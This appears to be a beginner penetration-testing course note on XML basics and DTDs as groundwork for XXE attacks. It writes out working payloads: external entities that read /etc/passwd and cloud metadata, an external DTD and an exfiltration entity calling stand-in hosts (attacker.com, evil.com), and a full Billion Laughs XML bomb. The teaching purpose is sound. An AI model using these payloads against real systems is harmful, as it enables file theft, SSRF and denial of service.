---
tags: [vapt, xxe, beginner]
difficulty: beginner
module: "14 - XXE"
topic: "14.02 XML Basics and DTD"
---

# 14.02 — XML Basics and DTD

## XML Structure Review

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- DECLARATION: tells parser this is XML 1.0 -->

<root>
  <!-- ELEMENT: tag with content -->
  <user id="1">
    <!-- ATTRIBUTE: key="value" on element -->
    <name>Alice</name>
    <email>alice@example.com</email>
  </user>
</root>

<!-- XML RULES:
  ✓ Must have exactly ONE root element
  ✓ Tags must be properly closed
  ✓ Case sensitive: <Name> ≠ <name>
  ✓ Attributes must be quoted
  ✓ Special chars must be escaped: & → &amp; < → &lt; > → &gt;
-->
```

---

## What Is a DTD (Document Type Definition)?

```xml
<!-- DTD DEFINES THE STRUCTURE AND ENTITIES OF AN XML DOCUMENT -->

<!-- INLINE DTD (inside the XML document itself): -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!-- Entity definition: -->
  <!ENTITY greeting "Hello World">
  <!-- External entity: -->
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<root>
  <message>&greeting;</message>  <!-- expands to: Hello World -->
  <file>&secret;</file>          <!-- expands to: contents of /etc/passwd! -->
</root>

<!-- EXTERNAL DTD (reference to an external .dtd file): -->
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
<root><data>test</data></root>
<!-- Parser fetches evil.dtd → defines malicious entities → executes them! -->
```

---

## Entity Types

```xml
<!-- 1. INTERNAL ENTITY (simple substitution): -->
<!DOCTYPE root [
  <!ENTITY company "Acme Corp">
]>
<name>&company;</name>  <!-- → "Acme Corp" -->

<!-- 2. EXTERNAL ENTITY (fetch from file or URL): -->
<!DOCTYPE root [
  <!ENTITY passwd SYSTEM "file:///etc/passwd">
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&passwd;</data>   <!-- → file contents! -->
<aws>&ssrf;</aws>       <!-- → cloud metadata! -->

<!-- 3. PARAMETER ENTITY (used in DTD, starts with %): -->
<!-- Normal entities: &name; -->
<!-- Parameter entities: %name; (only valid in DTD context) -->

<!DOCTYPE root [
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?data=VALUE'>">
  %eval;
  %exfiltrate;
]>
<!-- Parameter entities enable advanced blind XXE! -->

<!-- 4. PREDEFINED ENTITIES (built-in): -->
<!-- &lt;  → <  -->
<!-- &gt;  → >  -->
<!-- &amp; → &  -->
<!-- &quot; → " -->
<!-- &apos; → ' -->
```

---

## DOCTYPE Declaration Syntax

```
<!DOCTYPE rootElementName [
  entity definitions...
  element declarations...
]>

PARTS:
  DOCTYPE  → keyword
  rootElementName → the root element name of the document
  [ ... ]  → inline DTD subset (square brackets)
  
OR WITH EXTERNAL DTD:
  <!DOCTYPE root SYSTEM "URL_to_DTD_file">
  <!DOCTYPE root PUBLIC "PUBLIC_ID" "URL_to_DTD_file">

FOR XXE, WE CARE ABOUT:
  <!ENTITY name SYSTEM "URI">
  
  The SYSTEM keyword says: fetch from URI
  URI can be:
    file:///etc/passwd  → local file
    http://server/path  → HTTP URL (SSRF!)
    https://server/path
    ftp://server/path
    gopher://server/    (in some parsers)
```

---

## XML Namespaces (Quick Note)

```xml
<!-- NAMESPACES AVOID ELEMENT NAME CONFLICTS: -->
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <xsi:element>value</xsi:element>
</root>

<!-- FOR XXE PURPOSES:
  Namespaces don't affect XXE — DTD still parsed!
  Some WAFs look for <!DOCTYPE or <!ENTITY specifically.
  Bypasses exist (see note 14.09).
-->
```

---

## Billion Laughs (XML Bomb — DoS)

```xml
<!-- XML BOMB — CAUSES XML PARSER TO CONSUME HUGE MEMORY: -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

<!-- EFFECT:
  lol9 expands to 10^9 "lol" strings!
  ~3 GB in memory from a tiny XML file!
  Crashes the parser / server!
  
  NOTE: Only use in authorized testing (explicit permission required)
        This is a DoS attack!
-->
```

---

## Related Notes
- [[01 - What is XXE]] — XXE overview
- [[03 - Classic XXE File Read]] — using SYSTEM entities to read files
- [[06 - Blind XXE OOB]] — parameter entities for exfiltration
- [[10 - Defense Disable External Entity Processing]] — disabling entity processing
